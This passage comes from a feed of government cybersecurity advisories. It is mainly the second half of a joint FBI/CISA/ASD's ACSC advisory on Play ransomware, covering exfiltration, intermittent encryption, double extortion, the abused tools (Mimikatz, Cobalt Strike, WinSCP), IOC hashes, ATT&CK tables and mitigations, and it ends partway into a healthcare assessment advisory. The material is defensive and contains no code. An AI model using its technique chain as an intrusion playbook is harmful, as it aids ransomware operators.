[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1484/001/\" title=\"Domain Policy Modification: Group Policy Modification\">T1484.001</a>].</p>\n<h4><strong>Exfiltration and Encryption</strong></h4>\n<p>Play ransomware actors often split compromised data into segments and use tools like WinRAR to compress files [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a>] into <code>.RAR</code> format for exfiltration. The actors then use WinSCP to transfer data [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>] from a compromised network to actor-controlled accounts. Following exfiltration, files are encrypted [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>] with AES-RSA hybrid encryption using intermittent encryption, encrypting every other file portion of 0x100000 bytes. [<a href=\"https://www.sentinelone.com/labs/crimeware-trends-ransomware-developers-turn-to-intermittent-encryption-to-evade-detection/\" title=\"Crimeware Trends | Ransomware Developers Turn to Intermittent Encryption to Evade Detection\">3</a>] (<strong>Note: </strong>System files are skipped during the encryption process.) A <code>.play</code> extension is added to file names and a ransom note titled <code>ReadMe[.]txt</code> is placed in file directory <code>C:</code>.</p>\n<h4><strong>Impact</strong></h4>\n<p>The Play ransomware group uses a double-extortion model [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1657/\" title=\"Financial Theft\">T1657</a>], encrypting systems after exfiltrating data. The ransom note directs victims to contact the Play ransomware group at an email address ending in <code>@gmx[.]de</code>. Ransom payments are paid in cryptocurrency to wallet addresses provided by Play actors. If a victim refuses to pay the ransom demand, the ransomware actors threaten to publish exfiltrated data to their leak site on the Tor network (<code>[.]onion</code> URL).</p>\n<h4><strong>Leveraged Tools</strong></h4>\n<p>Table 1 lists legitimate tools Play ransomware actors have repurposed for their operations. The legitimate tools listed in this product are all publicly available. Use of these tools and applications should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 1: Tools Leveraged by Play Ransomware Actors</em></caption>\n<thead><tr><td><strong>Name</strong></td>\n<td><strong>Description</strong></td>\n</tr></thead><tbody><tr><td>\n<p>AdFind</p>\n</td>\n<td>\n<p>Used to query and retrieve information from Active Directory.</p>\n</td>\n</tr><tr><td>\n<p>Bloodhound</p>\n</td>\n<td>\n<p>Used to query and retrieve information from Active Directory.</p>\n</td>\n</tr><tr><td>\n<p>GMER</p>\n</td>\n<td>\n<p>A software tool intended to be used for detecting and removing rootkits.</p>\n</td>\n</tr><tr><td>\n<p>IOBit</p>\n</td>\n<td>\n<p>An anti-malware and anti-virus program for the Microsoft Windows operating system. Play actors have accessed IOBit to disable anti-virus software.</p>\n</td>\n</tr><tr><td>\n<p>PsExec</p>\n</td>\n<td>\n<p>A tool designed to run programs and execute commands on remote systems.</p>\n</td>\n</tr><tr><td>\n<p>PowerTool</p>\n</td>\n<td>\n<p>A Windows utility designed to improve speed, remove bloatware, protect privacy, and eliminate data collection, among other things.</p>\n</td>\n</tr><tr><td>\n<p>PowerShell</p>\n</td>\n<td>\n<p>A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</p>\n</td>\n</tr><tr><td>\n<p>Cobalt Strike</p>\n</td>\n<td>\n<p>A penetration testing tool used by security professionals to test the security of networks and systems. Play ransomware actors have used it to assist with lateral movement and file execution.</p>\n</td>\n</tr><tr><td>\n<p>Mimikatz</p>\n</td>\n<td>\n<p>Allows users to view and save authentication credentials such as Kerberos tickets. Play ransomware actors have used it to add accounts to domain controllers.</p>\n</td>\n</tr><tr><td>\n<p>WinPEAS</p>\n</td>\n<td>\n<p>Used to search for additional privilege escalation paths.</p>\n</td>\n</tr><tr><td>\n<p>WinRAR</p>\n</td>\n<td>\n<p>Used to split compromised data into segments and to compress files into <code>.RAR</code> format for exfiltration.</p>\n</td>\n</tr><tr><td>\n<p>WinSCP</p>\n</td>\n<td>\n<p>Windows Secure Copy is a free and open-source Secure Shell (SSH) File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Play ransomware actors have used it to transfer data [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>] from a compromised network to actor-controlled accounts.</p>\n</td>\n</tr><tr><td>\n<p>Microsoft Nltest</p>\n</td>\n<td>\n<p>Used by Play ransomware actors for network discovery.</p>\n</td>\n</tr><tr><td>\n<p>Nekto / PriviCMD</p>\n</td>\n<td>\n<p>Used by Play ransomware actors for privilege escalation.</p>\n</td>\n</tr><tr><td>\n<p>Process Hacker</p>\n</td>\n<td>\n<p>Used to enumerate running processes on a system.</p>\n</td>\n</tr><tr><td>\n<p>Plink</p>\n</td>\n<td>\n<p>Used to establish persistent SSH tunnels.</p>\n</td>\n</tr></tbody></table><h4><strong>Indicators of Compromise</strong></h4>\n<p>See Table 2 for Play ransomware IOCs obtained from FBI investigations as of October 2023.</p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 2: Hashes Associated with Play Ransomware Actors</em></caption>\n<thead><tr><td><strong>Hashes (SHA256)</strong></td>\n<td><strong>Description</strong></td>\n</tr></thead><tbody><tr><td>\n<p>453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb</p>\n</td>\n<td>\n<p>Play ransomware custom data gathering tool</p>\n</td>\n</tr><tr><td>\n<p>47c7cee3d76106279c4c28ad1de3c833c1ba0a2ec56b0150586c7e8480ccae57</p>\n</td>\n<td>\n<p>Play ransomware encryptor</p>\n</td>\n</tr><tr><td>\n<p>75404543de25513b376f097ceb383e8efb9c9b95da8945fd4aa37c7b2f226212</p>\n</td>\n<td>\n<p>SystemBC malware EXE</p>\n</td>\n</tr><tr><td>\n<p>7a42f96599df8090cf89d6e3ce4316d24c6c00e499c8557a2e09d61c00c11986</p>\n</td>\n<td>\n<p>SystemBC malware DLL</p>\n</td>\n</tr><tr><td>\n<p>7a6df63d883bbccb315986c2cfb76570335abf84fafbefce047d126b32234af8</p>\n</td>\n<td>\n<p>Play ransomware binary</p>\n</td>\n</tr><tr><td>\n<p>7dea671be77a2ca5772b86cf8831b02bff0567bce6a3ae023825aa40354f8aca</p>\n</td>\n<td>\n<p>SystemBC malware DLL</p>\n</td>\n</tr><tr><td>\n<p>c59f3c8d61d940b56436c14bc148c1fe98862921b8f7bad97fbc96b31d71193c</p>\n</td>\n<td>\n<p>Play network scanner</p>\n</td>\n</tr><tr><td>\n<p>e652051fe47d784f6f85dc00adca1c15a8c7a40f1e5772e6a95281d8bf3d5c74</p>\n</td>\n<td>\n<p>Play ransomware binary</p>\n</td>\n</tr><tr><td>\n<p>e8d5ad0bf292c42a9185bb1251c7e763d16614c180071b01da742972999b95da</p>\n</td>\n<td>\n<p>Play ransomware binary</p>\n</td>\n</tr></tbody></table><h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>\n<p>See Table 3–Table 11 for all referenced threat actor tactics and techniques in this advisory.</p>\n<table class=\"TableGrid1 tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 3: Play ATT&amp;CK Techniques for Enterprise for Initial Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Valid Accounts</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></p>\n</td>\n<td>\n<p>Play ransomware actors obtain and abuse existing account credentials to gain initial access.</p>\n</td>\n</tr><tr><td>\n<p>Exploit Public Facing Application</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public Facing Application\">T1190</a></p>\n</td>\n<td>\n<p>Play ransomware actors exploit vulnerabilities in internet-facing systems to gain access to networks.</p>\n</td>\n</tr><tr><td>\n<p>External Remote Services</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1133/\" title=\"External Remote Services\">T1133</a></p>\n</td>\n<td>\n<p>Play ransomware actors have used remote access services, such as RDP/VPN connection to gain initial access.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 4: Play ATT&amp;CK Techniques for Enterprise for Discovery</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>System Network Configuration Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1016/\" title=\"System Network Configuration Discovery\">T1016</a></p>\n</td>\n<td>\n<p>Play ransomware actors use tools like Grixba to identify network configurations and settings.</p>\n</td>\n</tr><tr><td>\n<p>Software Discovery: Security Software Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1518/001/\" title=\"Software Discovery: Security Software Discovery\">T1518.001</a></p>\n</td>\n<td>\n<p>Play ransomware actors scan for anti-virus software.</p>\n</td>\n</tr></tbody></table><table class=\"TableGrid3 tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 5: Play ATT&amp;CK Techniques for Enterprise for Defense Evasion</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>\n<th scope=\"col\" role=\"columnheader\">ID</th>\n<th scope=\"col\" role=\"columnheader\">Use</th>\n</tr></thead><tbody><tr><td>\n<p>Impair Defenses: Disable or Modify Tools</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></p>\n</td>\n<td>\n<p>Play ransomware actors use tools like GMER, IOBit, and PowerTool to disable anti-virus software.</p>\n</td>\n</tr><tr><td>\n<p>Indicator Removal: Clear Windows Event Logs</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1070/001/\" title=\"Indicator Removal: Clear Windows Event Logs\">T1070.001</a></p>\n</td>\n<td>\n<p>Play ransomware actors delete logs or other indicators of compromise to hide intrusion activity.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 6: Play ATT&amp;CK Techniques for Enterprise for Credential Access</em></caption>\n<thead><tr><td><strong>Technique Title</strong></td>\n<td><strong>ID</strong></td>\n<td><strong>Use</strong></td>\n</tr></thead><tbody><tr><td>\n<p>Unsecured Credentials</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1552/\" title=\"Unsecured Credentials\">T1552</a></p>\n</td>\n<td>\n<p>Play ransomware actors attempt to identify and exploit credentials stored unsecurely on a compromised network.</p>\n</td>\n</tr><tr><td>\n<p>OS Credential Dumping</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></p>\n</td>\n<td>\n<p>Play ransomware actors use tools like Mimikatz to dump credentials.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 7: Play ATT&amp;CK Techniques for Enterprise for Lateral Movement</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Lateral Tool Transfer</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1570/\" title=\"Lateral Tool Transfer\">T1570</a></p>\n</td>\n<td>\n<p>Play ransomware actors distribute executables within the compromised environment.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 8: Play ATT&amp;CK Techniques for Enterprise for Command and Control</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Domain Policy Modification: Group Policy Modification</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1484/001/\" title=\"Domain Policy Modification: Group Policy Modification\">T1484.001</a></p>\n</td>\n<td>\n<p>Play ransomware actors distribute executables via Group Policy Objects.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 9: Play ATT&amp;CK Techniques for Enterprise for Collection</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Archive Collected Data: Archive via Utility</p>\n</td>\n<td>\n<p><u><a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a></u></p>\n</td>\n<td>\n<p>Play ransomware actors use tools like WinRAR to compress files.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 10: Play ATT&amp;CK Techniques for Enterprise for Exfiltration</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Exfiltration Over Alternative Protocol</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a></p>\n</td>\n<td>\n<p>Play ransomware actors use file transfer tools like WinSCP to transfer data.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 11: Play ATT&amp;CK Techniques for Enterprise for Impact</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Data Encrypted for Impact</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></p>\n</td>\n<td>\n<p>Play ransomware actors encrypt data on target systems to interrupt availability to system and network resources.</p>\n</td>\n</tr><tr><td>\n<p>Financial Theft</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1657/\" title=\"Financial Theft\">T1657</a></p>\n</td>\n<td>\n<p>Play ransomware actors use a double-extortion model for financial gain.</p>\n</td>\n</tr></tbody></table><h3><strong>MITIGATIONS</strong></h3>\n<p>These mitigations apply to all critical infrastructure organizations and network defenders. The FBI, CISA, and ASD’s ACSC recommend that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of ransomware techniques (such as threat actors leveraging backdoor vulnerabilities into remote software systems), thus, strengthening the security posture for their customers.<br />\nFor more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design and Default</a> webpage and <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">joint guide</a>.</p>\n<p>The FBI, CISA, and ASD’s ACSC recommend organizations apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Play ransomware. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>\n<ul><li><strong>Implement a recovery plan</strong> to maintain and retain multiple copies of sensitive or proprietary data and servers [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.F, 2.R, 2.S</a>] in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).</li>\n<li><strong>Require all accounts</strong> with password logins (e.g., service account, admin accounts, and domain admin accounts) <strong>to comply</strong> with NIST’s <a href=\"https://pages.nist.gov/800-63-3/\" title=\"Digital Identity Guidelines\">standards</a> for developing and managing password policies [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.C</a>].\n<ul><li>Use longer passwords consisting of at least 8 characters and no more than 64 characters in length [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.B</a>];</li>\n<li>Store passwords in hashed format using industry-recognized password managers;</li>\n<li>Add password user “salts” to shared login credentials;</li>\n<li>Avoid reusing passwords;</li>\n<li>Implement multiple failed login attempt account lockouts [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.G</a>];</li>\n<li>Disable password “hints”;</li>\n<li>Refrain from requiring password changes more frequently than once per year.<br /><strong>Note:</strong> NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.</li>\n<li>Require administrator credentials to install software.</li>\n</ul></li>\n<li><strong>Require multifactor authentication</strong> [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.H</a>] for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. Also see <a href=\"https://www.cyber.gov.au/protect-yourself/resources-protect-yourself/personal-security-guides/protect-yourself-multi-factor-authentication\" title=\"Protect Yourself: Multi-Factor Authentication\">Protect Yourself: Multi-Factor Authentication | Cyber.gov.au</a>.</li>\n<li><strong>Keep all operating systems, software, and firmware up to date.</strong> Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">known exploited vulnerabilities</a> in internet-facing systems [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 1.E</a>]. Organizations are advised to deploy the latest Microsoft Exchange security updates. If unable to patch, then disable Outlook Web Access (OWA) until updates are able to be undertaken. Also see <a href=\"https://www.cyber.gov.au/resources-business-and-government/maintaining-devices-and-systems/system-hardening-and-administration/system-administration/patching-applications-and-operating-systems\" title=\"Patching Applications and Operating Systems\">Patching Applications and Operating Systems | Cyber.gov.au</a>.</li>\n<li><strong>Segment networks</strong> [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.F</a>] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Also see <a href=\"https://www.cyber.gov.au/resources-business-and-government/maintaining-devices-and-systems/system-hardening-and-administration/network-hardening/implementing-network-segmentation-and-segregation\" title=\"Implementing Network Segmentation and Segregation\">Implementing Network Segmentation and Segregation</a>.</li>\n<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware</strong> with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 1.E</a>]. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.</li>\n<li><strong>Filter network traffic </strong>by preventing unknown or untrusted origins from accessing remote services on internal systems. This prevents actors from directly connecting to remote access services they have established for persistence. Also see <a href=\"https://d3fend.mitre.org/technique/d3f:NetworkTrafficFiltering/\" title=\"Network Traffic Filtering\">Inbound Traffic Filtering – Technique D3-ITF</a>.</li>\n<li><strong>Install, regularly update, and enable real time detection for antivirus software</strong> on all hosts.</li>\n<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 1.A, 2.O</a>].</li>\n<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.E</a>].</li>\n<li><strong>Disable unused</strong> <strong>ports </strong>[<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.V</a>].</li>\n<li><strong>Consider adding an email banner to emails</strong> [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.M</a>] received from outside your organization.</li>\n<li><strong>Disable hyperlinks</strong> in received emails.</li>\n<li><strong>Implement time-based access for accounts set at the admin level and higher.</strong> For example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the <a href=\"https://www.cisa.gov/zero-trust-maturity-model\" title=\"Zero Trust Maturity Model\">Zero Trust model</a>). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.</li>\n<li><strong>Disable command-line and scripting activities and permissions.</strong> Privileged escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.E</a>].</li>\n<li><strong>Maintain offline backups of data</strong> and regularly maintain backup and restoration [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.R</a>]. By instituting this practice, an organization ensures they will not be severely interrupted, and/or only have irretrievable data.</li>\n<li><strong>Ensure backup data is encrypted, immutable </strong>(i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.K</a>].</li>\n</ul><h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>\n<p>In addition to applying mitigations, the FBI, CISA, and ASD’s ACSC recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The FBI, CISA, and ASD’s ACSC recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>\n<p>To get started:</p>\n<ol><li>Select an ATT&amp;CK technique described in this advisory (see Tables 3-11).</li>\n<li>Align your security technologies against this technique.</li>\n<li>Test your technologies against this technique.</li>\n<li>Analyze your detection and prevention technologies performance.</li>\n<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>\n<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>\n</ol><p>The FBI, CISA, and ASD’s ACSC recommend continually testing your security program at scale and in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>\n<h3><strong>RESOURCES</strong></h3>\n<ul><li><a href=\"https://www.stopransomware.gov/\" title=\"#StopRansomware\">Stopransomware.gov</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>\n<li>Resource to mitigate a ransomware attack: <a href=\"https://www.cisa.gov/resources-tools/resources/stopransomware-guide\" title=\"#StopRansomware Guide\">#StopRansomware Guide</a>.</li>\n<li>No-cost cyber hygiene services: <a href=\"https://www.cisa.gov/cyber-hygiene-services\" title=\"Cyber Hygiene Services\">Cyber Hygiene Services</a> and <a href=\"https://github.com/cisagov/cset/releases/tag/v10.3.0.0\" title=\"Ransomware Readiness Assessment CSET v10.3\">Ransomware Readiness Assessment</a>.</li>\n</ul><h3><strong>REPORTING</strong></h3>\n<p>The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Play ransomware actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>\n<p>The FBI, CISA, and ASD’s ACSC do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>, the FBI’s <a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complaint Center (IC3)\">Internet Crime Complaint Center (IC3)</a>, or CISA via CISA’s 24/7 Operations Center (<a href=\"mailto:report@cisa.gov?subject=Ransomware%20Incident\" title=\"Report to CISA\">report@cisa.gov</a> or 888-282-0870).</p>\n<p>Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ASD's ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to <a href=\"https://www.cyber.gov.au/\" title=\"Australian Signals Directorate’s Australian Cyber Security Centre\">cyber.gov.au</a>.</p>\n<h3><strong>DISCLAIMER</strong></h3>\n<p>The information in this report is being provided “as is” for informational purposes only. CISA and the FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or the FBI.</p>\n<h3><strong>REFERENCES</strong></h3>\n<p>[1] <a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/play-ransomware-volume-shadow-copy\" title=\"Play Ransomware Group Using New Custom Data-Gathering Tools\">Symantec: Play Ransomware Group Using New Custom Data-Gathering Tools</a><br />\n[2] <a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-play\" title=\"Ransomware Spotlight | Play\">TrendMicro: Play Ransomware Spotlight</a><br />\n[3] <a href=\"https://www.sentinelone.com/labs/crimeware-trends-ransomware-developers-turn-to-intermittent-encryption-to-evade-detection/\" title=\"Crimeware Trends | Ransomware Developers Turn to Intermittent Encryption to Evade Detection\">SentinelLabs: Ransomware Developers Turn to Intermittent Encryption to Evade Detection</a></p>\n","pubDate":"Mon, 11 Dec 2023 17:41:43 EST","dc:creator":"CISA","guid":{"@isPermaLink":"false","#text":"/node/20473"}},{"title":"Enhancing Cyber Resilience: Insights from the CISA Healthcare and Public Health Sector Risk and Vulnerability Assessment","link":"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-349a","description":"<h3><strong>SUMMARY</strong></h3>\n<p>In January 2023, the Cybersecurity and Infrastructure Security Agency (CISA) conducted a Risk and Vulnerability Assessment (RVA) at the request of a <a href=\"https://www.cisa.gov/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors/healthcare-and-public-health-sector\" title=\"Healthcare and Public Health Sector\">Healthcare and Public Health (HPH) sector</a> organization to identify vulnerabilities and areas for improvement. An RVA is a two-week penetration test of an entire organization, with one week spent on external testing and one week spent assessing the internal network. As part of the RVA, the CISA assessment team conducted web application, phishing, penetration, database, and wireless assessments. The assessed organization was a large organization deploying on-premises software.</p>\n<p>During the one-week external assessment, the assessment team did not identify any significant or exploitable conditions in externally available systems that may allow a malicious actor to easily obtain initial access to the organization’s network. Furthermore, the assessment team was unable to gain initial access to the assessed organization through phishing. However, during internal penetration testing, the team exploited misconfigurations, weak passwords, and other issues through multiple attack paths to compromise the organization’s domain.</p>\n<p>In coordination with the assessed organization, CISA is releasing this Cybersecurity Advisory (CSA) detailing the RVA team’s activities and key findings to provide network defenders and software 